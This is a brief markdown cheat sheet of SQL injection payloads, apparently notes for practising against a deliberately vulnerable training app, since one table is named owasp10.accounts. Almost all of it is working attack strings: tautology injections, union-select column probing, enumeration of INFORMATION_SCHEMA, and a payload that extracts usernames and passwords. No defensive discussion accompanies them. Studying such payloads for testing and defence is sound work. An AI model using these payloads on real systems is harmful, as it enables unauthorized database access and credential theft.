# SQL Injection

## Basic injection:

```
' or 1=1 --
```

## Basic injection returning 1 result starting at result 2:

```
' or 1=1 LIMIT 2,1 --
```

```
' union select null,null,null,null,null --
' union select null,concat_ws('.', table_schema, table_name, column_name),null,null,null from INFORMATION_SCHEMA.COLUMNS --
' union select null, owasp10.accounts.username, owasp10.accounts.password, null,null from owasp10.accounts --
```
